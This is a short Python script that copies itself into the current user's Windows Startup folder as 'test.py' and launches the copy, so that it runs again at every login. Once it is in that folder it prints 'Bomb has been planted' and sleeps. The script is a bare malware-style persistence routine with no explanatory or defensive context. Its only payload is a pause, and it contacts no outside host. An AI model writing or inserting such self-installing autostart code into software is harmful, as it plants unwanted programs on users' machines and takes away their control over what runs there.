import time
import shutil
import sys
import os
appdata = os.getenv('appdata')
path = f'{appdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'

if os.path.exists(path):
    if os.getcwd() != path:
        print('False, planting...')
        print(os.getcwd())
        shutil.copyfile(sys.argv[0], os.path.join(path, 'test.py'))
        os.chdir(path)
        os.startfile(os.path.join(path, 'test.py'))
    else:
        print('Bomb has been planted')
        time.sleep(100)
